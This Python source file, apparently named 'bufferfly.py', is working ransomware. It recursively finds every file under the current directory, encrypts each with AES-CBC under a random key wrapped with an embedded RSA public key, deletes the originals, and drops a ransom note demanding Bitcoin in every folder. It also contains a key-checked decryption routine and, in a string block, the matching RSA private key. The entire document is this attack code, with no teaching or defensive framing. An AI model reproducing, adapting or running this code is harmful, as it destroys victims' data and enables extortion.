import binascii
import os
import re
from Crypto.Cipher import AES
from Crypto.Util.number import *

RSA_n = 18461090511526494635680046089239911506582300448626881063830286038674865652783677024404293738678094212847547547457166471135492764422082854574133502325088817564614902648045539104101815287573218866088294414838961195968474193865414756152616434018063043282100025282389589552426871973306643932112713322426244034286383859635930292449783916320363306991656169643845016783071779181067359502011218907150938073150434398468282966556087934165438089239862856178140399744182514709857990974726101003114382533227994179033507725844701607500151684788922402605171926057790318786106279294985164731956599181078807132058577967175719374466651
RSA_e = 65537
"""
RSA_p = 119807499768836211350342676206482925679287104253346869642084052503357745080864442113316338668109206266466018277469585228043188083184512798195301806073963154242239155619393400182079126025380779667183115486486342167178409891248677893812381851047375670525278533619251694596740165854205109309378158444392599986457
RSA_q = 154089606636866906474082024194922333335958318226969654774734608271565862685736884490847461992598639762537223965516341181266090934721609249287262144659187734729036257235901545749325433265810560283294237666083462777922063315865848099409892895707539912894931576350868652774564474645632341780032303394440771057043
RSA_phi = (RSA_p - 1) * (RSA_q - 1)
RSA_d = inverse(RSA_e, RSA_phi)
RSA_d = 17681373732670194573859053862329676447757212213861798640394940634474917102698912418097152962190599137071085219133296950222069141553774489200967175907403451328460454770819086073902785354619274226856526116926724679337552171670021801866786409919279173043839914658136810452359466055701126584597752453352654405726609949158730624651384184956488527241957034536991941506866551976719042810104832398696011021406345209119446251970781389518050098247127611038760725924577309270690422953492967719049061514046098805352743236088200880641134160852320042221271459834023242193408332341642268046691706257802483298056878940789035164088497
"""

all_dir = []
all_file = []
readme_ = """Your files have been encrypted lol.
Transfer Bitcoins to this account: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
And mail the screenshot of transaction record to XXXXXXXXX@XXX.XXX
Then you will receive the key to decrypt"""


def get_file_and_path(path):
	lsdir = os.listdir(path)
	dirs = [i for i in lsdir if os.path.isdir(os.path.join(path, i))]
	if dirs:
		for i in dirs:
			get_file_and_path(os.path.join(path, i))
	files = [i for i in lsdir if os.path.isfile(os.path.join(path,i))]
	for f in dirs:
		temp = (os.path.join(path, f))
		if os.path.isdir(temp):
			all_dir.append(temp)
	for f in files:
		temp = (os.path.join(path, f))
		if not os.path.isdir(temp):
			all_file.append(temp)


def encrypt(path):
	key = os.urandom(16)
	key_enc = long_to_bytes(pow(bytes_to_long(key), RSA_e, RSA_n))
	file_head = b"{\"encrypted aeskey\":\"" + key_enc + b"\"}"
	enc = AES.new(key, AES.MODE_CBC, key)
	f = open(path, "rb")
	data = f.read()
	length = len(data)
	if length % 16 != 0:
		padlen = 16 - (length % 16)
		data = data + chr(padlen).encode() * padlen
	f.close()
	cipher = enc.encrypt(data)
	f = open(path + ".encrypted", "wb")
	f.write(file_head + cipher)
	f.close()
	os.remove(path)


def decrypt(path, key):
	f = open(path, "rb")
	byte_data = f.read()
	f.close()
	encrypted = binascii.hexlify(byte_data).decode()
	cipher = binascii.unhexlify(encrypted.split("227d")[1].encode())
	key_enc = binascii.unhexlify(encrypted.split("227d")[0].split("6579223a22")[1].encode())
	key = long_to_bytes(pow(bytes_to_long(key_enc), key, RSA_n))
	dec = AES.new(key, AES.MODE_CBC, key)
	file_paded = dec.decrypt(cipher)
	file = file_paded[:-file_paded[-1]]
	f = open(path[:-10], "wb")
	f.write(file)
	f.close()


def readme(path):
	for _ in path:
		f = open(_ + "/readme", "w")
		f.write(readme_)
		f.close()


def clean(path):
	for _ in path:
		if _[-6:] == "readme" or _[-10:] == ".encrypted":
			os.remove(_)


if __name__ == "__main__":
	get_file_and_path(".")
	all_file.pop(all_file.index("./bufferfly.py"))
	if "readme" not in os.listdir("."):	
		for _ in all_file:
			encrypt(_)
		readme(all_dir)
		f = open("./readme", "w")
		f.write(readme_)
		f.close()
	else:
		print(readme_)
		key = int(input("Entry the key: "))
		test = getPrime(1024)
		c = pow(test, RSA_e, RSA_n)
		check_key = (test == pow(c, key, RSA_n))
		if check_key == True:
			for _ in all_file:
				if _[-10:] == ".encrypted":
					decrypt(_, key)
			clean(all_file)
		else:
			print("This isn't true key!")